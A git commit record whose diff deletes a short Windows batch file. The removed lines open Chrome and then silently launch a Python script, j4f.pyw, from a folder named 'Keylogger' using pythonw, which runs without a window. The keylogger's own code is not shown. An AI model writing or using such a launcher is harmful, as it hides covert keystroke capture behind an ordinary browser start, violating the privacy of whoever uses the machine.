80597a1f5da7894da65d27a66214c6ae7fbae8c2
Hungtranowo <hungtrantuan20080@gmail.com>
2023-09-14 15:56:23 +0700

    update

--- a.bat
+++
@@ -1,5 +0,0 @@
-start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
-cd/
-cd Users\daidu\OneDrive\Máy tính\Python\Keylogger
-pythonw j4f.pyw
-start "" "C:\Users\daidu\OneDrive\Máy tính\Python\Keylogger\pythonw j4f.pyw"
